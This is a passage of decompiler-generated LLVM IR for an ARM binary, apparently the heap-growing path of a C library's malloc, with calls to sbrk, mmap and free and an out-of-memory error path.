  %v1_12b20 = add i32 %v4_12b14, 840
  %v2_12b20 = inttoptr i32 %v1_12b20 to i32*
  %v3_12b20 = load i32, i32* %v2_12b20, align 4
  store i32 %v3_12b20, i32* %r3.global-to-local, align 4
  %v1_12b24 = add i32 %v3_12b18, 4
  %v2_12b24 = inttoptr i32 %v1_12b24 to i32*
  %v3_12b24 = load i32, i32* %v2_12b24, align 4
  store i32 %v3_12b24, i32* %r1.global-to-local, align 4
  %v1_12b2c = urem i32 %v3_12b1c, 2
  %v2_12b2c = icmp eq i32 %v1_12b2c, 0
  %v1_12b28 = add i32 %v1_12b30, 16
  %v2_12b30 = add i32 %v1_12b28, %v3_12b20
  store i32 %v2_12b30, i32* %r3.global-to-local, align 4
  %v1_12b34 = and i32 %v3_12b24, -4
  store i32 %v1_12b34, i32* @r8, align 4
  br i1 %v2_12b2c, label %bb156, label %bb155

bb155:                                            ; preds = %dec_label_pc_12b0c
  %v3_12b38 = sub i32 %v2_12b30, %v1_12b34
  store i32 %v3_12b38, i32* %r3.global-to-local, align 4
  br label %bb156

bb156:                                            ; preds = %dec_label_pc_12b0c, %bb155
  %v0_12b3c = phi i32 [ %v2_12b30, %dec_label_pc_12b0c ], [ %v3_12b38, %bb155 ]
  %v1_12b3c = load i32, i32* %sb.global-to-local, align 4
  %v2_12b3c = add i32 %v1_12b3c, %v0_12b3c
  store i32 %v2_12b3c, i32* %r3.global-to-local, align 4
  %v1_12b40 = sub i32 -1, %v1_12b3c
  store i32 %v1_12b40, i32* %fp.global-to-local, align 4
  %v2_12b44 = and i32 %v2_12b3c, %v1_12b40
  store i32 %v2_12b44, i32* @r5, align 4
  %tmp157 = icmp slt i32 %v2_12b44, 1
  br i1 %tmp157, label %dec_label_pc_12b68, label %dec_label_pc_12b54

dec_label_pc_12b54:                               ; preds = %bb156
  store i32 %v2_12b44, i32* %r0.global-to-local, align 4
  %v1_12b58 = call i32 @__GI_sbrk(i32 %v2_12b44)
  store i32 %v1_12b58, i32* %r0.global-to-local, align 4
  %v3_12b5c = icmp eq i32 %v1_12b58, -1
  store i32 %v1_12b58, i32* @r4, align 4
  br i1 %v3_12b5c, label %dec_label_pc_12b68, label %dec_label_pc_12bd4

dec_label_pc_12b68:                               ; preds = %dec_label_pc_12b54, %bb156
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r1.global-to-local, align 4
  %v4_12b70 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 64) to i32*), align 4
  store i32 %v4_12b70, i32* %r6.global-to-local, align 4
  %v1_12b74 = add i32 %v4_12b70, 864
  %v2_12b74 = inttoptr i32 %v1_12b74 to i32*
  %v3_12b74 = load i32, i32* %v2_12b74, align 4
  store i32 %v3_12b74, i32* %r3.global-to-local, align 4
  %v1_12b78 = urem i32 %v3_12b74, 2
  %v2_12b78 = icmp eq i32 %v1_12b78, 0
  br i1 %v2_12b78, label %.thread32thread-pre-split, label %bb158

bb158:                                            ; preds = %dec_label_pc_12b68
  %v1_12b7c = load i32, i32* @r8, align 4
  %v2_12b7c = load i32, i32* %sb.global-to-local, align 4
  %v3_12b7c = add i32 %v2_12b7c, %v1_12b7c
  %v2_12b80 = load i32, i32* @r5, align 4
  %v3_12b80 = add i32 %v3_12b7c, %v2_12b80
  store i32 %v3_12b80, i32* %r3.global-to-local, align 4
  %v2_12b84 = load i32, i32* %fp.global-to-local, align 4
  %v3_12b84 = and i32 %v2_12b84, %v3_12b80
  store i32 %v3_12b84, i32* @r5, align 4
  br label %.thread32

.thread32thread-pre-split:                        ; preds = %dec_label_pc_12b68
  %v0_12b88.pr = load i32, i32* @r5, align 4
  br label %.thread32

.thread32:                                        ; preds = %.thread32thread-pre-split, %bb158
  %v0_12b88 = phi i32 [ %v0_12b88.pr, %.thread32thread-pre-split ], [ %v3_12b84, %bb158 ]
  %v2_12b88 = icmp ugt i32 %v0_12b88, 1048575
  br i1 %v2_12b88, label %bb160, label %bb159

bb159:                                            ; preds = %.thread32
  store i32 1048576, i32* @r5, align 4
  br label %bb160

bb160:                                            ; preds = %.thread32, %bb159
  %v0_12ba0 = phi i32 [ %v0_12b88, %.thread32 ], [ 1048576, %bb159 ]
  %v1_12b90 = load i32, i32* @sl, align 4
  %tmp217 = icmp ugt i32 %v0_12ba0, %v1_12b90
  br i1 %tmp217, label %dec_label_pc_12b98, label %dec_label_pc_12dfc

dec_label_pc_12b98:                               ; preds = %bb160
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_12ba0, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_12bb4 = call i32 @mmap(i32 0, i32 %v0_12ba0, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_12bb4, i32* %r0.global-to-local, align 4
  %v3_12bb8 = icmp eq i32 %v6_12bb4, -1
  %v8_12bb8 = icmp eq i32 %v6_12bb4, -1
  store i32 %v6_12bb4, i32* @r4, align 4
  br i1 %v8_12bb8, label %.thread35, label %bb161

bb161:                                            ; preds = %dec_label_pc_12b98
  %v1_12bc0 = load i32, i32* %r6.global-to-local, align 4
  %v2_12bc0 = add i32 %v1_12bc0, 864
  %v3_12bc0 = inttoptr i32 %v2_12bc0 to i32*
  %v4_12bc0 = load i32, i32* %v3_12bc0, align 4
  %v2_12bc4 = load i32, i32* @r5, align 4
  %v3_12bc4 = add i32 %v2_12bc4, %v6_12bb4
  store i32 %v3_12bc4, i32* %r0.global-to-local, align 4
  %v2_12bc8 = and i32 %v4_12bc0, -2
  store i32 %v2_12bc8, i32* %r3.global-to-local, align 4
  store i32 %v2_12bc8, i32* %v3_12bc0, align 4
  br label %.thread35

.thread35:                                        ; preds = %dec_label_pc_12b98, %bb161
  br i1 %v3_12bb8, label %dec_label_pc_12bd4, label %dec_label_pc_12bd8

dec_label_pc_12bd4:                               ; preds = %.thread35, %dec_label_pc_12b54
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12bd8

dec_label_pc_12bd8:                               ; preds = %.thread35, %dec_label_pc_12bd4
  %v0_12bd8 = load i32, i32* @r4, align 4
  %v7_12bd8 = icmp eq i32 %v0_12bd8, -1
  br i1 %v7_12bd8, label %dec_label_pc_12dfc, label %dec_label_pc_12be0

dec_label_pc_12be0:                               ; preds = %dec_label_pc_12bd8
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r2.global-to-local, align 4
  %v4_12be8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 64) to i32*), align 4
  store i32 %v4_12be8, i32* %ip.global-to-local, align 4
  store i32 %v3_12b18, i32* %r2.global-to-local, align 4
  %v1_12bf0 = add i32 %v4_12be8, 872
  %v2_12bf0 = inttoptr i32 %v1_12bf0 to i32*
  %v3_12bf0 = load i32, i32* %v2_12bf0, align 4
  %v1_12bf4 = load i32, i32* @r8, align 4
  %v2_12bf4 = add i32 %v1_12bf4, %v3_12b18
  store i32 %v2_12bf4, i32* %r1.global-to-local, align 4
  %v0_12bf8 = load i32, i32* @r5, align 4
  %v2_12bf8 = add i32 %v0_12bf8, %v3_12bf0
  store i32 %v2_12bf8, i32* %r3.global-to-local, align 4
  %v9_12bfc = icmp eq i32 %v0_12bd8, %v2_12bf4
  br i1 %v9_12bfc, label %bb162, label %.thread125

.thread125:                                       ; preds = %dec_label_pc_12be0
  store i32 %v2_12bf8, i32* %v2_12bf0, align 4
  br label %dec_label_pc_12c18

bb162:                                            ; preds = %dec_label_pc_12be0
  %v1_12c00 = load i32, i32* %r0.global-to-local, align 4
  %v8_12c00 = icmp eq i32 %v1_12c00, -1
  store i32 %v2_12bf8, i32* %v2_12bf0, align 4
  br i1 %v8_12c00, label %.thread37, label %dec_label_pc_12c18

.thread37:                                        ; preds = %bb162
  %v1_12c08 = load i32, i32* @r5, align 4
  %v2_12c08 = load i32, i32* @r8, align 4
  %v3_12c08 = add i32 %v2_12c08, %v1_12c08
  %v2_12c0c = or i32 %v3_12c08, 1
  store i32 %v2_12c0c, i32* %r3.global-to-local, align 4
  %v2_12c10 = load i32, i32* %r2.global-to-local, align 4
  %v3_12c10 = add i32 %v2_12c10, 4
  %v4_12c10 = inttoptr i32 %v3_12c10 to i32*
  store i32 %v2_12c0c, i32* %v4_12c10, align 4
  br label %dec_label_pc_12d90

dec_label_pc_12c18:                               ; preds = %bb162, %.thread125
  %v0_12c1c.pr = load i32, i32* @r8, align 4
  %v0_12c18 = load i32, i32* %ip.global-to-local, align 4
  %v1_12c18 = add i32 %v0_12c18, 864
  %v2_12c18 = inttoptr i32 %v1_12c18 to i32*
  %v3_12c18 = load i32, i32* %v2_12c18, align 4
  store i32 %v3_12c18, i32* %r2.global-to-local, align 4
  %v2_12c1c = icmp eq i32 %v0_12c1c.pr, 0
  br i1 %v2_12c1c, label %.thread40, label %.thread39

.thread40:                                        ; preds = %dec_label_pc_12c18
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread43

.thread39:                                        ; preds = %dec_label_pc_12c18
  %v2_12c24 = urem i32 %v3_12c18, 2
  store i32 %v2_12c24, i32* %r3.global-to-local, align 4
  %v2_12c28 = icmp eq i32 %v2_12c24, 0
  br i1 %v2_12c28, label %.thread43, label %dec_label_pc_12c30

dec_label_pc_12c30:                               ; preds = %.thread39
  %v0_12c30 = load i32, i32* @r4, align 4
  %v1_12c30 = load i32, i32* %r1.global-to-local, align 4
  %v3_12c30 = icmp ult i32 %v0_12c30, %v1_12c30
  br i1 %v3_12c30, label %bb163, label %.thread43

bb163:                                            ; preds = %dec_label_pc_12c30
  %v2_12c34 = and i32 %v3_12c18, -2
  store i32 %v2_12c34, i32* %r3.global-to-local, align 4
  store i32 %v2_12c34, i32* %v2_12c18, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_12c30, %.thread40, %.thread39, %bb163
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %ip.global-to-local, align 4
  %v4_12c44 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 64) to i32*), align 4
  store i32 %v4_12c44, i32* @r7, align 4
  %v1_12c48 = add i32 %v4_12c44, 864
  %v2_12c48 = inttoptr i32 %v1_12c48 to i32*
  %v3_12c48 = load i32, i32* %v2_12c48, align 4
  store i32 %v3_12c48, i32* %r3.global-to-local, align 4
  %v1_12c4c = urem i32 %v3_12c48, 2
  store i32 %v1_12c4c, i32* @r6, align 4
  %v2_12c4c = icmp eq i32 %v1_12c4c, 0
  br i1 %v2_12c4c, label %dec_label_pc_12ce0, label %dec_label_pc_12c54

dec_label_pc_12c54:                               ; preds = %.thread43
  %v0_12c54 = load i32, i32* @r8, align 4
  %v2_12c54 = icmp eq i32 %v0_12c54, 0
  br i1 %v2_12c54, label %.thread46, label %bb164

bb164:                                            ; preds = %dec_label_pc_12c54
  %v2_12c58 = add i32 %v4_12c44, 872
  %v3_12c58 = inttoptr i32 %v2_12c58 to i32*
  %v4_12c58 = load i32, i32* %v3_12c58, align 4
  store i32 %v4_12c58, i32* %r2.global-to-local, align 4
  %v1_12c5c = load i32, i32* %r1.global-to-local, align 4
  %v2_12c5c = load i32, i32* @r4, align 4
  %v3_12c5c = sub i32 %v2_12c5c, %v1_12c5c
  %v3_12c60 = add i32 %v3_12c5c, %v4_12c58
  store i32 %v3_12c60, i32* %r3.global-to-local, align 4
  store i32 %v3_12c60, i32* %v3_12c58, align 4
  br label %.thread46

.thread46:                                        ; preds = %dec_label_pc_12c54, %bb164
  %v0_12c68 = load i32, i32* @r4, align 4
  %v1_12c68 = urem i32 %v0_12c68, 8
  store i32 %v1_12c68, i32* %r3.global-to-local, align 4
  %v2_12c68 = icmp eq i32 %v1_12c68, 0
  br i1 %v2_12c68, label %.thread47, label %bb165

bb165:                                            ; preds = %.thread46
  %v2_12c6c = sub nsw i32 8, %v1_12c68
  store i32 %v2_12c6c, i32* %r3.global-to-local, align 4
  %v3_12c70 = add i32 %v2_12c6c, %v0_12c68
  store i32 %v3_12c70, i32* @r7, align 4
  br label %.thread47

.thread47:                                        ; preds = %.thread46, %bb165
  %v0_12c78 = phi i32 [ 0, %.thread46 ], [ %v2_12c6c, %bb165 ]
  %v1_12c74 = load i32, i32* @r5, align 4
  %v2_12c74 = add i32 %v1_12c74, %v0_12c68
  store i32 %v2_12c74, i32* @r6, align 4
  %v1_12c78 = load i32, i32* @r8, align 4
  %v2_12c78 = add i32 %v2_12c74, %v0_12c78
  %v2_12c7c = add i32 %v2_12c78, %v1_12c78
  store i32 %v2_12c7c, i32* %r1.global-to-local, align 4
  %v1_12c80 = load i32, i32* %sb.global-to-local, align 4
  %v2_12c80 = add i32 %v1_12c80, %v2_12c7c
  %v1_12c84 = load i32, i32* %fp.global-to-local, align 4
  %v2_12c84 = and i32 %v1_12c84, %v2_12c80
  store i32 %v2_12c84, i32* %r2.global-to-local, align 4
  %v2_12c88 = sub i32 0, %v2_12c74
  store i32 %v2_12c88, i32* %r3.global-to-local, align 4
  %v2_12c8c = sub i32 %v2_12c84, %v2_12c74
  store i32 %v2_12c8c, i32* @r5, align 4
  store i32 %v2_12c8c, i32* %r0.global-to-local, align 4
  br i1 %v2_12c68, label %bb166, label %bb167

bb166:                                            ; preds = %.thread47
  store i32 %v0_12c68, i32* @r7, align 4
  br label %bb167

bb167:                                            ; preds = %.thread47, %bb166
  %v1_12c98 = call i32 @__GI_sbrk(i32 %v2_12c8c)
  store i32 %v1_12c98, i32* %r0.global-to-local, align 4
  %v3_12c9c = icmp eq i32 %v1_12c98, -1
  br i1 %v3_12c9c, label %dec_label_pc_12ca4, label %dec_label_pc_12cb4

dec_label_pc_12ca4:                               ; preds = %bb167
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12ca8 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_12ca8, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_12d0c

dec_label_pc_12cb4:                               ; preds = %bb167
  %v1_12cb4 = load i32, i32* @r4, align 4
  %v3_12cb4 = icmp ult i32 %v1_12c98, %v1_12cb4
  br i1 %v3_12cb4, label %dec_label_pc_12cbc, label %dec_label_pc_12d0c

dec_label_pc_12cbc:                               ; preds = %dec_label_pc_12cb4
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r0.global-to-local, align 4
  %v4_12cc4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 64) to i32*), align 4
  store i32 %v4_12cc4, i32* %r2.global-to-local, align 4
  %v1_12cc8 = add i32 %v4_12cc4, 864
  %v2_12cc8 = inttoptr i32 %v1_12cc8 to i32*
  %v3_12cc8 = load i32, i32* %v2_12cc8, align 4
  %v0_12ccc = load i32, i32* @r6, align 4
  store i32 %v0_12ccc, i32* %r0.global-to-local, align 4
  %v1_12cd0 = and i32 %v3_12cc8, -2
  store i32 %v1_12cd0, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_12cd0, i32* %v2_12cc8, align 4
  br label %dec_label_pc_12d0c

dec_label_pc_12ce0:                               ; preds = %.thread43
  %v0_12ce0 = load i32, i32* %r0.global-to-local, align 4
  %v3_12ce0 = icmp eq i32 %v0_12ce0, -1
  br i1 %v3_12ce0, label %dec_label_pc_12ce8, label %dec_label_pc_12d04

dec_label_pc_12ce8:                               ; preds = %dec_label_pc_12ce0
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_12cec = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_12cec, i32* %r0.global-to-local, align 4
  %v0_12cf0 = load i32, i32* @r7, align 4
  %v1_12cf0 = add i32 %v0_12cf0, 872
  %v2_12cf0 = inttoptr i32 %v1_12cf0 to i32*
  %v3_12cf0 = load i32, i32* %v2_12cf0, align 4
  store i32 %v3_12cf0, i32* %r2.global-to-local, align 4
  %v0_12cf4 = load i32, i32* @r4, align 4
  %v0_12cf8 = load i32, i32* @r5, align 4
  %v2_12cf4 = add i32 %v3_12cf0, %v1_12cec
  %v2_12cf8 = sub i32 %v2_12cf4, %v0_12cf4
  %v2_12cfc = sub i32 %v2_12cf8, %v0_12cf8
  store i32 %v2_12cfc, i32* %r3.global-to-local, align 4
  store i32 %v2_12cfc, i32* %v2_12cf0, align 4
  %v0_12d08.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_12d04

dec_label_pc_12d04:                               ; preds = %dec_label_pc_12ce0, %dec_label_pc_12ce8
  %v0_12d08 = phi i32 [ 0, %dec_label_pc_12ce0 ], [ %v0_12d08.pre, %dec_label_pc_12ce8 ]
  %v0_12d04 = load i32, i32* @r4, align 4
  store i32 %v0_12d04, i32* @r7, align 4
  store i32 %v0_12d08, i32* @r5, align 4
  br label %dec_label_pc_12d0c

dec_label_pc_12d0c:                               ; preds = %dec_label_pc_12cb4, %dec_label_pc_12cbc, %dec_label_pc_12ca4, %dec_label_pc_12d04
  %v0_12d0c = load i32, i32* %r0.global-to-local, align 4
  %v7_12d0c = icmp eq i32 %v0_12d0c, -1
  br i1 %v7_12d0c, label %dec_label_pc_12d90, label %dec_label_pc_12d14

dec_label_pc_12d14:                               ; preds = %dec_label_pc_12d0c
  %v1_12d14 = load i32, i32* @r5, align 4
  %v2_12d14 = add i32 %v1_12d14, %v0_12d0c
  %v0_12d18 = load i32, i32* @r7, align 4
  %v2_12d18 = sub i32 %v2_12d14, %v0_12d18
  %v1_12d1c = or i32 %v2_12d18, 1
  %v2_12d20 = add i32 %v0_12d18, 4
  %v3_12d20 = inttoptr i32 %v2_12d20 to i32*
  store i32 %v1_12d1c, i32* %v3_12d20, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r1.global-to-local, align 4
  store i32 64, i32* %r3.global-to-local, align 4
  %v4_12d2c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 64) to i32*), align 4
  store i32 %v4_12d2c, i32* @r6, align 4
  %v1_12d30 = add i32 %v4_12d2c, 872
  %v2_12d30 = inttoptr i32 %v1_12d30 to i32*
  %v3_12d30 = load i32, i32* %v2_12d30, align 4
  %v0_12d34 = load i32, i32* @r8, align 4
  %v2_12d34 = icmp eq i32 %v0_12d34, 0
  %v0_12d38 = load i32, i32* @r5, align 4
  %v2_12d38 = add i32 %v0_12d38, %v3_12d30
  store i32 %v2_12d38, i32* %r3.global-to-local, align 4
  store i32 %v2_12d38, i32* %v2_12d30, align 4
  %v0_12d40 = load i32, i32* @r7, align 4
  %v1_12d40 = load i32, i32* @r6, align 4
  %v2_12d40 = add i32 %v1_12d40, 44
  %v3_12d40 = inttoptr i32 %v2_12d40 to i32*
  store i32 %v0_12d40, i32* %v3_12d40, align 4
  br i1 %v2_12d34, label %dec_label_pc_12d90, label %dec_label_pc_12d48

dec_label_pc_12d48:                               ; preds = %dec_label_pc_12d14
  %v0_12d4c = load i32, i32* @r8, align 4
  %v1_12d4c = add i32 %v0_12d4c, -12
  %v1_12d50 = and i32 %v1_12d4c, -8
  store i32 %v3_12b18, i32* %ip.global-to-local, align 4
  %v2_12d58 = add i32 %v1_12d50, %v3_12b18
  store i32 %v2_12d58, i32* %r1.global-to-local, align 4
  %v2_12d5c = icmp ugt i32 %v1_12d50, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_12d64 = or i32 %v1_12d50, 1
  store i32 %v1_12d64, i32* %r3.global-to-local, align 4
  store i32 %v1_12d64, i32* %v2_12b24, align 4
  %v0_12d6c = load i32, i32* %r2.global-to-local, align 4
  %v1_12d6c = load i32, i32* %r1.global-to-local, align 4
  %v2_12d6c = add i32 %v1_12d6c, 8
  %v3_12d6c = inttoptr i32 %v2_12d6c to i32*
  store i32 %v0_12d6c, i32* %v3_12d6c, align 4
  %v0_12d70 = load i32, i32* %r2.global-to-local, align 4
  %v1_12d70 = load i32, i32* %r1.global-to-local, align 4
  %v2_12d70 = add i32 %v1_12d70, 4
  %v3_12d70 = inttoptr i32 %v2_12d70 to i32*
  store i32 %v0_12d70, i32* %v3_12d70, align 4
  br i1 %v2_12d5c, label %dec_label_pc_12d78, label %dec_label_pc_12d90

dec_label_pc_12d78:                               ; preds = %dec_label_pc_12d48
  %v0_12d78 = load i32, i32* @r6, align 4
  %v1_12d78 = add i32 %v0_12d78, 836
  %v2_12d78 = inttoptr i32 %v1_12d78 to i32*
  %v3_12d78 = load i32, i32* %v2_12d78, align 4
  store i32 %v3_12d78, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_12d80 = load i32, i32* %ip.global-to-local, align 4
  %v1_12d80 = add i32 %v0_12d80, 8
  store i32 %v1_12d80, i32* @r0, align 4
  store i32 -1, i32* %v2_12d78, align 4
  %v0_12d88 = call i32 @free()
  store i32 %v0_12d88, i32* %r0.global-to-local, align 4
  %v0_12d8c = load i32, i32* @r4, align 4
  %v1_12d8c = load i32, i32* @r6, align 4
  %v2_12d8c = add i32 %v1_12d8c, 836
  %v3_12d8c = inttoptr i32 %v2_12d8c to i32*
  store i32 %v0_12d8c, i32* %v3_12d8c, align 4
  br label %dec_label_pc_12d90

dec_label_pc_12d90:                               ; preds = %.thread37, %dec_label_pc_12d48, %dec_label_pc_12d14, %dec_label_pc_12d0c, %dec_label_pc_12d78
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r0.global-to-local, align 4
  %v4_12d98 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 64) to i32*), align 4
  store i32 %v4_12d98, i32* %lr.global-to-local, align 4
  %v1_12d9c = add i32 %v4_12d98, 872
  store i32 %v1_12d9c, i32* %r1.global-to-local, align 4
  %v1_12da0 = inttoptr i32 %v1_12d9c to i32*
  %v2_12da0 = load i32, i32* %v1_12da0, align 4
  store i32 %v2_12da0, i32* %r1.global-to-local, align 4
  %v3_12da0 = add i32 %v4_12d98, 876
  %v4_12da0 = inttoptr i32 %v3_12da0 to i32*
  %v5_12da0 = load i32, i32* %v4_12da0, align 4
  store i32 %v5_12da0, i32* %r3.global-to-local, align 4
  %v1_12da8 = add i32 %v4_12d98, 868
  %v2_12da8 = inttoptr i32 %v1_12da8 to i32*
  %v3_12da8 = load i32, i32* %v2_12da8, align 4
  store i32 %v3_12da8, i32* %r3.global-to-local, align 4
  %v1_12dac = add i32 %v4_12d98, 884
  %v2_12dac = inttoptr i32 %v1_12dac to i32*
  %v3_12dac = load i32, i32* %v2_12dac, align 4
  store i32 %v3_12dac, i32* %r2.global-to-local, align 4
  %v2_12db0 = add i32 %v3_12da8, %v2_12da0
  store i32 %v2_12db0, i32* %r3.global-to-local, align 4
  %tmp218 = icmp ugt i32 %v2_12da0, %v5_12da0
  br i1 %tmp218, label %bb168, label %bb169

bb168:                                            ; preds = %dec_label_pc_12d90
  store i32 %v2_12da0, i32* %v4_12da0, align 4
  %v0_12db8.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_12db8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb169

bb169:                                            ; preds = %dec_label_pc_12d90, %bb168
  %v1_12db8 = phi i32 [ %v3_12dac, %dec_label_pc_12d90 ], [ %v1_12db8.pre, %bb168 ]
  %v4_12dbc = phi i32 [ %v2_12db0, %dec_label_pc_12d90 ], [ %v0_12db8.pre, %bb168 ]
  %tmp219 = icmp ugt i32 %v4_12dbc, %v1_12db8
  br i1 %tmp219, label %bb170, label %bb171

bb170:                                            ; preds = %bb169
  %v5_12dbc = load i32, i32* %lr.global-to-local, align 4
  %v6_12dbc = add i32 %v5_12dbc, 884
  %v7_12dbc = inttoptr i32 %v6_12dbc to i32*
  store i32 %v4_12dbc, i32* %v7_12dbc, align 4
  br label %bb171

bb171:                                            ; preds = %bb169, %bb170
  %v0_12dc0 = load i32, i32* %lr.global-to-local, align 4
  %v1_12dc0 = add i32 %v0_12dc0, 44
  %v2_12dc0 = inttoptr i32 %v1_12dc0 to i32*
  %v3_12dc0 = load i32, i32* %v2_12dc0, align 4
  store i32 %v3_12dc0, i32* %ip.global-to-local, align 4
  %v1_12dc4 = add i32 %v3_12dc0, 4
  %v2_12dc4 = inttoptr i32 %v1_12dc4 to i32*
  %v3_12dc4 = load i32, i32* %v2_12dc4, align 4
  store i32 %v1_129d8, i32* %r1.global-to-local, align 4
  %v1_12dcc = and i32 %v3_12dc4, -4
  store i32 %v1_12dcc, i32* %r3.global-to-local, align 4
  %v3_12dd0 = icmp ult i32 %v1_12dcc, %v1_129d8
  br i1 %v3_12dd0, label %dec_label_pc_12dfc, label %dec_label_pc_12dd8

dec_label_pc_12dd8:                               ; preds = %bb171
  %v0_12dd8 = load i32, i32* @sl, align 4
  %v2_12dd8 = sub i32 %v1_12dcc, %v0_12dd8
  %v2_12ddc = add i32 %v0_12dd8, %v3_12dc0
  store i32 %v2_12ddc, i32* %r1.global-to-local, align 4
  %v1_12de0 = or i32 %v2_12dd8, 1
  store i32 %v1_12de0, i32* %r3.global-to-local, align 4
  %v1_12de4 = or i32 %v0_12dd8, 1
  store i32 %v1_12de4, i32* %r2.global-to-local, align 4
  %v1_12de8 = add i32 %v3_12dc0, 8
  store i32 %v1_12de8, i32* %r0.global-to-local, align 4
  store i32 %v1_12de4, i32* %v2_12dc4, align 4
  %v0_12df0 = load i32, i32* %r1.global-to-local, align 4
  %v1_12df0 = load i32, i32* %lr.global-to-local, align 4
  %v2_12df0 = add i32 %v1_12df0, 44
  %v3_12df0 = inttoptr i32 %v2_12df0 to i32*
  store i32 %v0_12df0, i32* %v3_12df0, align 4
  %v0_12df4 = load i32, i32* %r3.global-to-local, align 4
  %v1_12df4 = load i32, i32* %r1.global-to-local, align 4
  %v2_12df4 = add i32 %v1_12df4, 4
  %v3_12df4 = inttoptr i32 %v2_12df4 to i32*
  store i32 %v0_12df4, i32* %v3_12df4, align 4
  br label %dec_label_pc_12e14

dec_label_pc_12dfc:                               ; preds = %bb160, %bb171, %dec_label_pc_12bd8
  store i32 62608, i32* %r3.global-to-local, align 4
  %v0_12e00 = call i32 @__aeabi_read_tp()
  %v3_12e04 = load i16, i16* @global_var_2229c.359, align 2
  %v4_12e04 = sext i16 %v3_12e04 to i32
  store i32 %v4_12e04, i32* %r3.global-to-local, align 4
  store i32 12, i32* %r2.global-to-local, align 4
  %v3_12e0c = add i32 %v4_12e04, %v0_12e00
  %v4_12e0c = inttoptr i32 %v3_12e0c to i32*
  store i32 12, i32* %v4_12e0c, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_12e14

dec_label_pc_12e14:                               ; preds = %bb154, %bb153, %dec_label_pc_12dd8, %dec_label_pc_12a20, %dec_label_pc_12dfc
  %v0_12e14 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_12e14, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_12e18

dec_label_pc_12e18:                               ; preds = %.thread4, %dec_label_pc_129ec, %.thread124, %dec_label_pc_1285c, %dec_label_pc_12850, %dec_label_pc_126b8, %dec_label_pc_1263c, %dec_label_pc_12e14
  store i32 %v2_1255c, i32* %r0.global-to-local, align 4
  store i32 1, i32* @r1, align 4
  store i32 44, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_22244.363 to i32), i32* %r2.global-to-local, align 4
  %v4_12e28 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_22244.363 to i32), i32 44) to i32*), align 4
  store i32 %v4_12e28, i32* @ip, align 4
  store i32 77364, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_12e28)
  br label %dec_label_pc_12e34

dec_label_pc_12e34:                               ; preds = %dec_label_pc_12594, %dec_label_pc_12e18
  %v0_12e34 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_12e34, i32* %r0.global-to-local, align 4
  store i32 %v3_12530, i32* @r4, align 4
  store i32 %v6_12530, i32* @r5, align 4
  store i32 %v9_12530, i32* @r6, align 4
  store i32 %v12_12530, i32* @r7, align 4
  store i32 %v15_12530, i32* @r8, align 4
  store i32 %v18_12530, i32* @sb, align 4
  store i32 %v21_12530, i32* @sl, align 4
  store i32 %v24_12530, i32* @fp, align 4
  store i32 %v27_12530, i32* @lr, align 4
  ret i32 %v0_12e34

; uselistorder directives
  uselistorder i32 %v0_12dd8, { 1, 0, 2 }
  uselistorder i32 %v3_12dc0, { 1, 0, 2, 3 }
  uselistorder i32 %v4_12dbc, { 1, 0 }
  uselistorder i32 %v2_12da0, { 2, 0, 1, 3 }
  uselistorder i32 %v4_12d98, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_12d50, { 1, 2, 0 }
  uselistorder i32 %v0_12d18, { 1, 0 }
  uselistorder i32 %v0_12d0c, { 1, 0 }
  uselistorder i32 %v2_12cfc, { 1, 0 }
  uselistorder i32 %v2_12c8c, { 2, 1, 0 }
  uselistorder i32 %v2_12c74, { 1, 2, 0, 3 }
  uselistorder i32 %v2_12c6c, { 1, 0, 2 }
  uselistorder i32 %v1_12c68, { 2, 1, 0 }
  uselistorder i32 %v0_12c68, { 3, 1, 2, 0 }
  uselistorder i32 %v1_12c4c, { 1, 0 }
  uselistorder i32 %v2_12c24, { 1, 0 }
  uselistorder i32 %v3_12c18, { 1, 0, 2 }
  uselistorder i32 %v2_12bf8, { 1, 0, 2 }
  uselistorder i32* %v2_12bf0, { 1, 0, 2 }
